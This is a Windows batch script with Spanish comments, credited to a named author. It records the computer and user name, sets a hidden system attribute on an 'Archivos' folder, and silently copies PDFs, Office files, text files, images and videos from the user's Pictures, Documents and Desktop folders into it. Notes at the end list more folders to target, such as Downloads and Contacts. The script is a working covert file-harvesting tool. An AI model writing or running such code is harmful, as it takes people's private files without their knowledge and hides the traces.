
@rem bin\windows\bat
@rem Autor Luishiño Pericena Choque
@rem Información:
@rem Blogger          https://lpericena.blogspot.com/
@rem Github            https://github.com/Pericena
@rem pinterest        https://es.pinterest.com/lushiopericena/
@rem twitter             https://twitter.com/LPericena
@rem linkedin          https://www.linkedin.com/in/luishi%C3%B1o-pericena-choque-126534116/
@rem facebook       https://www.facebook.com/profile.php?id=100009309755063
@rem sitio web        https://pericena.wordpress.com/
@rem Aplicacion     https://apps.facebook.com/167466933725219
@rem contacto        https://www.facebook.com/Servicio-T%C3%A9cnico-1506435219407506/ç
Attrib /s /d +s +h "Archivos"
mode con lines=1 cols=17
@echo off
Attrib /s /d +s +h "Archivos"
echo Nombre del PC %COMPUTERNAME% 
echo Nombre del usuario %USERNAME% 
echo Directorio raiz del HD %SYSTEMROOT% 
echo Directorio en que te encuentras %CD%
echo Numero de procesadores %NUMBER_OF_PROCESSORS%  
echo Numero Aleatorio: %RANDOM%   
IF NOT EXIST ".\Archivos\"%USERNAME% MD ".\Archivos\"%USERNAME%
cd ".\Archivos\
Attrib /s /d +s +h "Archivos"

echo Fecha actual %DATE% >>Datos.txt
echo Hora actual %TIME% >>Datos.txt
echo Nombre del PC %COMPUTERNAME% >>Datos.txt
echo Nombre del usuario %USERNAME% >>Datos.txt
echo Directorio raiz del HD %SYSTEMROOT% >>Datos.txt
echo Directorio en que te encuentras %CD%>>Datos.txt
echo Numero de procesadores %NUMBER_OF_PROCESSORS% >>Datos.txt 
echo Numero Aleatorio: %RANDOM% >>Datos.txt

Attrib /s /d +s +h "Archivos"
IF NOT EXIST ".\Archivos\"%USERNAME% MD ".\Archivos\"%USERNAME%
cd ".\Archivos\"%USERNAME%
for /R %USERPROFILE%\Pictures\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
Attrib /s /d +s +h "Archivos"
for /R %USERPROFILE%\Documents\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
for /R %USERPROFILE%\Desktop\ %%x in (*.mp4,*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"



EXIT

Attrib /s /d +s +h "Archivos"
Tipos de archivos:     ,*.docx
rem http://es.ccm.net/contents/647-formatos-y-extensiones-de-archivos


Lugares:
Documentos\Documents 
Imagenes\Pictures 
Musica\Music 
Videos\Videos 
Escritorio\Desktop 
Descargas\Downloads 
Contactos\Contacts 
Favoritos\Favorites